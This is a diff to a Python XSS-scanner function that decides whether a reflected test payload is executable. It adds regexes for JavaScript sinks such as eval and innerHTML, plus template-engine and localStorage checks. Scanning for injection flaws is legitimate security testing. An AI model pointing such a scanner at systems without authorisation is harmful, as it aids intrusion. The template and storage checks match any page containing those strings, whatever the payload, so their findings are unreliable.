@@ -1251,15 +1470,22 @@ def is_reflected(payload: str, response_text: str, soup: BeautifulSoup) -> tuple
             if payload in str(tag):
                 return True, f"Inside {tag.name} tag (potential sanitizer bypass)"
 
+        # Check for template engine patterns (e.g., Handlebars, AngularJS)
+        if any(pattern in response_text for pattern in ['{{', '}}', 'ng-', 'ng-app', 'ng-bind']):
+            return True, "Inside template engine context (potential injection)"
+
         if any(c in payload for c in '<>"\'') and payload in response_text:
             return True, "Unescaped in HTML (potential injection)"
 
         logging.debug(f"Payload '{payload}' found but not in executable context")
         return False, "Reflected but not executable"
 
+    # Expanded executable patterns to include high-risk functions
     executable_patterns = [
         r'alert\(.+\)', r'javascript:[^"]+', r'on[a-z]+\s*=\s*["\'][^"\']+["\']',
-        r'srcdoc\s*=\s*["\'][^"\']+["\']', r'http-equiv\s*=\s*["\']refresh["\']'
+        r'srcdoc\s*=\s*["\'][^"\']+["\']', r'http-equiv\s*=\s*["\']refresh["\']',
+        r'eval\(.+\)', r'settimeout\(.+\)', r'innerhtml\s*=\s*["\'][^"\']+["\']',
+        r'document\.write\(.+\)', r'postmessage\(.+\)'
     ]
     for pattern in executable_patterns:
         matches = re.findall(pattern, payload, re.IGNORECASE)
@@ -1284,6 +1510,10 @@ def is_reflected(payload: str, response_text: str, soup: BeautifulSoup) -> tuple
                     return True, "Unescaped in HTML (executable portion)"
                 logging.debug(f"Executable portion '{match}' found but not in executable context")
                 return False, "Executable portion reflected but not executable"
+
+    # Check for reflection in LocalStorage/SessionStorage (simulated check)
+    if 'localstorage' in response_text.lower() or 'sessionstorage' in response_text.lower():
+        return True, "Potential DOM-based XSS in LocalStorage/SessionStorage"
 
     logging.debug(f"Payload '{payload}' not reflected or not executable")
     return False, "Not reflected or not executable"
